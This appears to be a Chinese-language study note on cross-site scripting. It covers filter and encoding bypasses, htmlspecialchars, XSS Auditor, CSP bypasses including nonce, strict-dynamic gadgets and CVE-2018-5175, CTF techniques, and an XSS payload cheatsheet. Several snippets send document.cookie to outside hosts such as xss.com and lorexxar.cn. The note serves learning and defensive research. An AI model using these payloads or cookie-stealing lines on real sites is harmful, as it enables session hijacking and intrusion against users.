# Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
1. reflected xss (非持久型):  
`<?php echo 'xss, '.$_GET['script']; ?>`

2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
`<?php echo 'xss, '.$DB_value; ?>`

3. DOM xss: 最近の流行り  
通過DOM操作觸發

注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  
  
*  [XSS detection](#xss-detection)  
*  [常見限制 and 對抗手勢](#常見限制-and-對抗手勢)  
*  [htmlspecialchars繞過](#htmlspecialchars-bypass)
*  [XSS-Auditor介紹與繞過](#xss-auditor-intro-and-bypass)  
*  [CSP介紹與繞過](#csp-intro-and-bypass)  
*  [正規表達式](#正規表達式)  
*  [攻擊手勢](#攻擊手勢)  
*  [popunder彈窗手勢](#彈窗手勢)  
*  [Cheatsheet](#cheatsheet)    
*  [Reference](#reference)

# XSS detection
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<a href=1 onload=alert(1)>hi</a>
```
在這裏個人認為較重要的是分析注入點對網頁產生的影響，我注入的惡意代碼沒有作用可能有兩種原因：  
1. 網頁不存在可利用的xss漏洞，可能注入點直接將值插入網頁作為內容  
2. 惡意代碼被過濾掉，或者轉譯了 -> 這種情況下就要分析有沒有代替字元來繞過過濾名單，或者繞過轉譯！

# 常見限制 and 對抗手勢
* 大小寫混用  
* toUpperCase()  
```js
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k
```
* 一次過濾繞過  
```php
str_replace('<script>','',$GET['hi'])  //這裏代表hi中的<script>會變空字串
// <scr<script>ipt> 
```  
* 使用正規表達式高效率的過濾  
```php
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])   // 大寫小寫一次繞過全都會被擋掉
// <img src=1 onerror=alert(1)>
```
* encode 轉譯危險標籤  
  * url encode: `% + ASCII(hex) %3Cscript%3E`  
  * http://www.jsfuck.com/  
  補充js常見處理函式: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
  * html encode
  ```php
  htmlspecialchars($_GET['hi']);  // 會將特殊字元通通轉譯掉 
  // 這種情況下將無法再進行注入
  ```  
  * unicode encode: %u + ASCII(hex) ASP,IIS上會自動解析unicode編碼，`<%s%cr%u0131pt>`  
  * `IBM037`,`IBM500`,`IBM1026`,`cp875` 利用方法可以參考[ASPX上繞過RequestValidation](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
  * ascii encode
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  [Encode_tool](http://monyer.com/demo/monyerjs/)  
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  外部引入自己的js  
* 未過濾`\n`類符號  
```js
<img src="javas
cript:
alert(/1/);">
```
* XSS filters  
* WAF  
* HTML Sanitizer  
* CSP(Content-Security-Policy)  
  這部分內容有點多，我還是獨立出來筆記好了:sweat:  

# htmlspecialchars bypass  
php內部函數，可將`&`,`'`,`"`,`<`,`>`五種字元轉成字串。沒有第二個參數(`ENT_QUOTES`)時不會過濾單引號。  
1. `htmlspecialchars($input)`在`value`屬性內：  
```php
<input value="<" onclick=alert(1)>
```  
特殊字元被轉換成字串而閉合`value`屬性  
2. 若頁面的編碼可控，可以嘗試用不同編碼繞過特殊字元，e.g. UTF-7

# XSS Auditor Intro and bypass
XSS是chrome上面專門對付**Reflected XSS**的第三方防禦手段[XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor)  
這邊順便提一下三個瀏覽器XSS filter的工作原理：  
1. IE XSS filter: 用正則取代request或response中的危險字元  
2. Chrome XSS Auditor: 檢查request或reponse中的危險字元，**若放入HTML架構有危險再刪除**  
3. Firefox Noscript: 只檢查request中的危險字元
```
// disable
X-XSS-Protection: 0

// 單去除危險的頁面部分
X-XSS-Protection: 1

// 攔截頁面response並且導向about:blank
X-XSS-Protection: 1; mode=block

// 將report送到想要的地方
X-XSS-Protection: 1; mode=block; report=https://example.com/log.cgi
X-XSS-Protection: 1; report="https://example.com/log.cgi?jsessionid=132;abc"
```

Auditor reference:  
* Source code  
[xss_auditor.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor.h)  
[xss_auditor_delegate.h](https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/html/parser/xss_auditor_delegate.h)

# CSP Intro and bypass
從瀏覽器的層面來防禦漏洞[Content Security Policy Level 3](https://www.w3.org/TR/CSP/)  
主要有兩種 1. 限制`js`執行 2. 限制對別的域的請求  
怎麼看一個網站的CSP呢？  
```php
curl -I https://github.com/
// 列出header
// 我們可以看到github已經開啟了XSS-Protection
// 並且也能看到CSP的內容
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com wss://live.github.com; font-src assets-cdn.github.com; form-action 'self' github.com gist.github.com; frame-ancestors 'none'; frame-src render.githubusercontent.com; img-src 'self' data: assets-cdn.github.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com *.githubusercontent.com; manifest-src 'self'; media-src 'none'; script-src assets-cdn.github.com; style-src 'unsafe-inline' assets-cdn.github.com
```
現在開始解讀CSP  
```php
header("Content-Security-Policy: default-src 'self '; script-src * ");
```
以上CSP歡迎您加載任何domain的js :-1: ，此外會禁止加載domain外的source
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
```
以上CSP只能讓您加載當前domain下的js，尋找後台上傳內容為js的圖片或文件，`src=upload/1pwnch.js`
```php
header(" Content-Security-Policy: default-src 'self '; script-src http://localhost/static/ ");
Content-Security-Policy: script-src 'self' trusted.domain.com
```
以上第一例中CSP只能加載特定資料夾下的js，這時候可以尋找`static/`下有沒有可控的跳轉文件(302)，我們可以把這個文件當作跳板去加載我們上傳的js文件  
第二例中可以找trusted.domain.com中有沒有可以bypass的script，或者有沒有**jsonp**的利用點，如下：  
```php
<script src="trusted.domain.com/jsonp?callback=alert(1)//"></script>
```
除了jsonp，`Angularjs`也可被用來bypass，因此下面的`strict-dynamic`便顯得更加重要了  
來看看最常見的CSP  
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
```
`unsafe-inline`指頁面中直接添加的`<script>`可以被執行，再來便是繞過domain的限制：  
  1. 用js製造link prefetch  
     [什麼是prefetch](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Link_prefetching_FAQ)  
     prefetch下面還有`DNS-prefetch`,`subresource`,`prefetch`,`preconnect`,`prerender`幾個概念  
     不是所有source都能預加載的，e.g. ajax，開啟developer tool的頁面    
     ```js
     // 只有chrome可用  
     var x = document.createElement("link");
     x.setAttribute("rel", "prefetch");
     x.setAttribute("href", "//xxxxx.com/?" + document.cookie);
     document.head.appendChild(x);
     ```
  2. 跳轉 && 跨域  
     跳轉的部分注意跳板也受host的限制，src路徑則跳脫限制  
     ```js
     <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
     <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
     <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
     // 
     var x = document.createElement("x");
     x.href='http://xss.com/?cookie='+escape(document.cookie);
     x.click();
     ```  
* nonce script CSP  
  這是在CSP2出現的概念，Web應用會根據一個隨機token來判斷腳本是否可信任  
  ```php
  header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{隨機}' ");
  ```
  以上CSP只有帶一樣nonce`<script nonce="{隨機}">alert(1)</script>`的script才可以執行  
  但是要**繞過**也很簡單，這個`隨機`字符串基本上是每次request都會重新產生(一次性)  
  ```php
  // 假設header裡面是類似 nonce-".$random." 在後端產生
  <script nonce="<?php echo $random ?>">
  ```  
  **Sebastian Lekies** 提出**DOM XSS**可以完虐nonce script CSP  
  [How to bypass CSP nonces with DOM XSS 🎅](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)  
  諸如`location.hash`操作的xss攻擊，根本不需要經過後台，那nonce的值也不會刷新  
* strict-dynamic  
  這是在CSP3中新規範的一種參數，為了現代各式各樣的框架而提出  
  ```js
  script-src 'nonce-random' 'strict-dynamic'; object-src 'none'
  // 以下為masakato對strict-dynamic的解釋
  // 可加載
  <script src='test.com/a.js' nonce='random'></script>
  ```
  這樣一行CSP就可以確保所有**靜態**的`script`有匹配的nonce，strict-dynamic可以幫助開發人員在web運行過程中動態加載受信任的腳本  
  如果`a.js`想要加載其他的js，只有**非parser-inserted**的script可以被允許執行  
  ```js
  <!-- a.js -->
  // 可加載
  var script = document.createElement('script');
  script.src = 'test.com/dependency.js';
  document.body.appendChild(script);
  // 不可
  document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
  ```
  `createElement`時，element還屬於非parser-inserted屬性的，使用`documemt.write`的話就是parser-inserted屬性的了  
    
  :cat2:**Script Gadgets**：  
  [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
  Script Gadget是指一些已存在的js code用來bypass xss mitigations  
  ```js
  // bypass with require.js
  Content-Security-Policy: "default-src='none';script-src 'nonce-random' 'strict-dynamic'"
  <script data-main="data:,alert(1)"></script>
  <script nonce="random" src="require.js"></script>
  // 原因：require.js在找到帶有data-main屬性的script時，會如下載入
  var node = document.createElement('script');
  node.src = 'data:,alert(1)';
  document.head.appendChild(node);
  // 如上面提到的，非parser-inserted
  ```

  :cat2:**CVE-2018-5175** (利用**add-on**繞過strict-dynamic)：  
  [首先extension和add-on都是些什麼東西？](https://developer.mozilla.org/zh-TW/Add-ons/WebExtensions)  
  legacy-extension就是那些過去以XUL/XPCOM為基礎所建造的擴充，雖然2017/11後基礎已改為Web-extensions，但瀏覽器內部至今還多使用這個機制  
  這裡我們必須了解`manifest`下的`web_accessible_resources`(webextension)以及`contentaccessible flag`(legacy extension)，被這個`url contentaccessible=yes`的resource可以從任何頁面載入，這裡就有個弊端了，**任何頁面載入並且不需要nonce允許**！  
  ```json
  ....
  resource devtools devtools/modules/devtools/
  resource devtools-client-jsonview resouce://devtools/client/jsonview/ contentaccessible=yes
  ....
  ```
  上面是firefox extension下`manifest`的一部分，可以知道`resource://devtools`下面的file都可以從任何頁面載入而不需要nonce的允許，而`resource://devtools/client/jsonview/lib/require.js`也不例外。  
  ```js
  <!-- exploit -->
  csp: strict-dynamic...

  <script data-main="data:,alert(1)"></script>
  <script src="resource://devtools-client-jsonview/lib/require.js"></script>
  ```
  所以我們不需要nonce也能讓`require.js`載入執行，靠script-gadget中提到`require.js`尋找`data-main`屬性，不難理解這個xss的攻擊就會成功bypass csp了！  

  若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
  某段script中將`attribute`的值插入`innerHTML`;  
  
以web開發人員的角度推薦幾個工具：  
1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  

以上筆記很大部分取自  
[LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
[CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
非常推薦閱讀原文  
[迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)


# 正規表達式
js中會用正規表達式來過濾危險字符  
```js
/g -> 全局匹配
/i -> case insensitive
```
參考如下文件：  
[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)

# 攻擊手勢  
這裡整理一些攻擊手勢以及比賽中碰到的思路  
* 不同的`<tag>`做利用  
```js
// script
<script>a=prompt;a(1)</script>

// img
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">

// svg
<svg/onload=alert(1)>

// body
// 這種payload也可以繞過括號過濾
<body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
```
* DOM based XSS  
```js
<script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
// #之後的內容不會被傳送到server端
```
* bootstrap data-* 屬性  
```js
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<button data-toggle="collapse" data-target="<img src=x onerror=alert(0)>">Test</button>

// 關於這個漏洞的解釋issue中有一個評論很清楚
<button data-toggle="collapse" data-target="<?=htmlspecialchars($_GET['x']);?>">Test</button>
// 雖然有參數可控但是htmlspecialchar轉義，這本該是安全的，但是會在bootstrap環境下data-target的屬性中觸發
```
值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
[XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
* Vue.js  
with SSTI  
* `<base>`覆蓋相對路徑下的js  
這是我在RCTF-2018中碰到的比賽思路，CSP沒有限制`base-uri`因此可以用`<base>`繞過，而頁面中剛好又有用相對路徑引用外部的js檔，我們便可以自己偽造一個無視CSP的js  
**Exploit**:  
:point_down: 頁面中被插入`<base href="http://controlled_domain/">`  
:point_down: 被引入的`/assets/jquery.min.js`全都變成`http://controlled_domain/assets/jquery.min.js`  
:point_down: `controlled_domain/assets/jquery.min.js`我們可以在裡面插入`location.href=url;`  
:point_down: 當我們訪問最前面被插入`<base>`的頁面時就會被導到這個`url`囉！  
細節詳見：[rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)  
* `<base target>`竊取頁面內容  
跟上面同樣利用`<base>`tag但是觀念完全不同  
**Exploit**:  
:point_down: 透過xss漏洞插入不完整的`<base target>`標籤到頁面中  
:point_down: `target`讓頁面中所有URL[http://evil.com/](http://evil.com/)的page都設下了同名的`window.name`!  
:point_down: [http://evil.com/](http://evil.com/)頁面中有`<script>alert(name);</script>`的功能  
:point_down: 彈框的內容為target的name  
[參考原文](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  

# 彈窗手勢
現在大部分的瀏覽器都禁止未禁用戶允許的彈窗了  
@MasatoKinugawa 發現一個bypass限制的技巧：  
```js
<script>
onkeydown=function(){
    window.open('//example.com/','_blank','a');
}
onkeypress=function(){
    window.open('about:blank','_blank').close();
}
```
以上效果可瀏覽 https://vulnerabledoma.in/popunder/keyevent.html  
[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)  

# Cheatsheet
```php
</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
"><script>al\u0065rt(document.domain)</script>
"><script>al\u{65}rt(document.domain)</script>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>

// document.write take multiple arguments
document.write("<s","crip","t>al","ert(","1)","</s","cript>")

// Unicode-based
location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'

// redirection
atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()
```
上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  

# Reference
1. The Web Application Hacker's Handbook  
2. [看雪](https://www.kanxue.com)  
3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
8. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
10. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
